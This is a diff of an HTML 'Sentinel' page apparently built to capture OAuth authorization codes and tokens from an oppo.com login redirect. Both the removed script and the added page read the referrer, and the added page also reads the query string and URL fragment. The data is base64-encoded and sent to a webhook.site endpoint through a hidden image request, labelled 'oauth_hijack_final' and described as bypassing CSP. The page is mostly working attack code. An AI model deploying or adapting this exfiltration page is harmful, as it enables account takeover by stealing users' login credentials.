@@ -1,24 +1,106 @@
-<script>
-    const webhookUrl = "https://webhook.site/7f9c8926-c9df-44ee-9350-db06430369aa";
-    
-    // 1. Immediate Exfiltration (No waiting for UI)
-    const leakingReferrer = document.referrer;
-    
-    if (leakingReferrer) {
-        // Force the capture via Image (Ghost) immediately
-        const exfiltrator = new Image();
-        const encodedData = btoa(unescape(encodeURIComponent(leakingReferrer)));
-        exfiltrator.src = `${webhookUrl}?leak_b64=${encodedData}&type=final_killshot&ts=${Date.now()}`;
-        
-        console.log("Sentinel: Handshake exfiltrated.");
-    }
-
-    // 2. Safe UI Update
-    window.onload = () => {
-        const statusEl = document.getElementById('status');
-        if (statusEl) {
-            statusEl.innerText = leakingReferrer.includes("oppo.com") ? 
-                "CRITICAL: Handshake Captured." : "Waiting for Handshake...";
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Forge Vertical - Audit Handshake</title>
+    <style>
+        body { 
+            font-family: 'Courier New', Courier, monospace; 
+            background: #0a0a0a; 
+            color: #00ff41; 
+            display: flex; 
+            align-items: center; 
+            justify-content: center; 
+            height: 100vh; 
+            margin: 0; 
+            overflow: hidden;
         }
-    };
-</script>
+        .box { 
+            border: 2px solid #00ff41; 
+            padding: 3rem; 
+            border-radius: 12px; 
+            box-shadow: 0 0 30px rgba(0, 255, 65, 0.4); 
+            text-align: center; 
+            max-width: 80%;
+        }
+        h1 { 
+            font-size: 1.8rem; 
+            text-transform: uppercase; 
+            letter-spacing: 4px; 
+            margin-bottom: 1rem;
+        }
+        #status { 
+            font-weight: bold; 
+            font-size: 1.2rem;
+            transition: color 0.5s ease;
+        }
+        .scanner {
+            width: 100%;
+            height: 2px;
+            background: #00ff41;
+            margin-top: 20px;
+            animation: scan 2s infinite linear;
+        }
+        @keyframes scan {
+            0% { opacity: 0.2; }
+            50% { opacity: 1; }
+            100% { opacity: 0.2; }
+        }
+    </style>
+</head>
+<body>
+    <div class="box">
+        <h1>Forge Vertical: Sentinel</h1>
+        <p id="status">INITIALIZING LISTENER...</p>
+        <div class="scanner"></div>
+    </div>
+
+    <script>
+        // CONFIGURATION: Replace with your active Webhook Node
+        const webhookUrl = "https://webhook.site/7f9c8926-c9df-44ee-9350-db06430369aa";
+
+        // 1. DATA COLLECTION (The "Triple Threat")
+        const leakingReferrer = document.referrer;
+        const urlParams = window.location.search;
+        const hashData = window.location.hash;
+
+        // 2. THE GHOST EXFILTRATOR (Executes immediately)
+        if (leakingReferrer.includes("oppo.com") || urlParams.length > 1 || hashData.length > 1) {
+            
+            // Build the audit package
+            const payload = {
+                event: "OPPO_V3_HANDSHAKE",
+                ref: leakingReferrer || "DIRECT",
+                query: urlParams || "NONE",
+                fragment: hashData || "NONE",
+                ts: Date.now()
+            };
+
+            // Base64 encode the JSON for safe transmission over GET
+            const encodedPayload = btoa(unescape(encodeURIComponent(JSON.stringify(payload))));
+            
+            // Fire the Ghost Image (Bypasses most CSP/XSS Protections)
+            const ghost = new Image();
+            ghost.src = `${webhookUrl}?data=${encodedPayload}&type=oauth_hijack_final&v=3.0`;
+            
+            console.log("Sentinel: Handshake exfiltrated to Webhook Node.");
+        }
+
+        // 3. UI SYNC (Executes after DOM is ready to avoid 'null' errors)
+        window.onload = () => {
+            const statusEl = document.getElementById('status');
+            
+            const isOppo = leakingReferrer.includes("oppo.com");
+            const hasCode = urlParams.includes("code") || hashData.includes("token");
+
+            if (isOppo || hasCode) {
+                statusEl.innerText = "CRITICAL: Handshake Intercepted. Data Sent.";
+                statusEl.style.color = "#ff3131";
+            } else {
+                statusEl.innerText = "LISTENER ACTIVE. WAITING FOR HANDSHAKE.";
+            }
+        };
+    </script>
+</body>
+</html>
